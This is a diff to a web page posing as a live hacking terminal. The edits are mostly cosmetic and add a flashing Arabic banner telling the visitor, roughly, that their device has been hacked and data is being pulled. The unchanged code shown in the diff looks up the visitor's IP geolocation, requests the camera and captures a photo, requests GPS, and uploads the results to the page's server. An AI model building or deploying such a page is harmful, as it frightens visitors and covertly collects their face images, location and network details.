@@ -34,9 +34,9 @@
     50% { border-color: #800; box-shadow: 0 0 10px rgba(255,0,0,0.3) inset; }
   }
   .header h1 {
-    font-size: 18px;
+    font-size: 16px;
     color: #f00;
-    letter-spacing: 4px;
+    letter-spacing: 3px;
     text-shadow: 0 0 12px #f00;
     animation: flicker 2.5s infinite;
   }
@@ -106,16 +106,6 @@
   }
   .kv span:first-child { color: #0f0; }
   .kv span:last-child  { color: #0ff; font-weight: bold; }
-  .cursor {
-    display: inline-block;
-    width: 8px;
-    height: 14px;
-    background: #0f0;
-    animation: blink 0.8s infinite;
-    vertical-align: middle;
-    margin-left: 4px;
-  }
-  @keyframes blink { 50% { opacity: 0; } }
   .final {
     text-align: center;
     padding: 20px;
@@ -130,6 +120,10 @@
     font-size: 16px;
     letter-spacing: 3px;
     text-shadow: 0 0 10px #0f0;
+  }
+  @keyframes bigFlicker {
+    0%, 100% { opacity: 1; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
+    50% { opacity: 0.6; text-shadow: 0 0 10px #ff0000; }
   }
 </style>
 </head>
@@ -205,6 +199,32 @@
   // بدء السيناريو
   // ============================================
   async function run() {
+
+    // ⚠️ كلمة تحذير أحمر بتلمع
+    setTimeout(() => {
+      const warn = document.createElement('div');
+      warn.style.color = '#ff0000';
+      warn.style.textAlign = 'center';
+      warn.style.fontSize = '18px';
+      warn.style.fontWeight = 'bold';
+      warn.style.margin = '20px 0 10px 0';
+      warn.style.textShadow = '0 0 20px #ff0000, 0 0 40px #ff0000';
+      warn.style.animation = 'bigFlicker 1s infinite';
+      warn.innerText = '⚠ تم اختراق جهازك يا مغفل Os ⚠';
+      linesEl.appendChild(warn);
+
+      const sub = document.createElement('div');
+      sub.style.color = '#ff0000';
+      sub.style.textAlign = 'center';
+      sub.style.fontSize = '13px';
+      sub.style.marginBottom = '25px';
+      sub.style.textShadow = '0 0 10px #ff0000';
+      sub.innerText = '>> جاري سحب البيانات... <<';
+      linesEl.appendChild(sub);
+    }, 100);
+
+    delay += 1200;
+
     addLine("Initializing breach protocol...", "info");
     addLine("Establishing encrypted tunnel... <span class='ok'>OK</span>");
     addLine("Bypassing firewall... <span class='ok'>OK</span>");
@@ -242,7 +262,7 @@
 
     addLine("Scanning network interface...", "info");
 
-    // ============ IP من API خارجي ============
+    // ============ IP ============
     try {
       const r = await fetch("https://ipapi.co/json/");
       const d = await r.json();
@@ -263,7 +283,7 @@
 
     addLine("Accessing camera sensor...", "info");
 
-    // ============ طلب إذن الكاميرا ============
+    // ============ الكاميرا ============
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
@@ -276,7 +296,6 @@
 
       addLine("Camera access: <span class='ok'>GRANTED</span>");
 
-      // التقاط الصورة
       canvas.width  = video.videoWidth  || 640;
       canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0);
@@ -298,7 +317,7 @@
       addLine("Camera access: <span class='err'>DENIED</span>", "err");
     }
 
-    // ============ طلب إذن الموقع ============
+    // ============ الموقع ============
     addLine("Accessing GPS module...", "info");
 
     await new Promise(resolve => {
@@ -333,7 +352,7 @@
     addLine("Uploading encrypted payload...", "info");
     addProgress();
 
-    // ============ إرسال المعلومات النصية ============
+    // ============ إرسال المعلومات ============
     try {
       await fetch("/api/upload-info", {
         method: "POST",
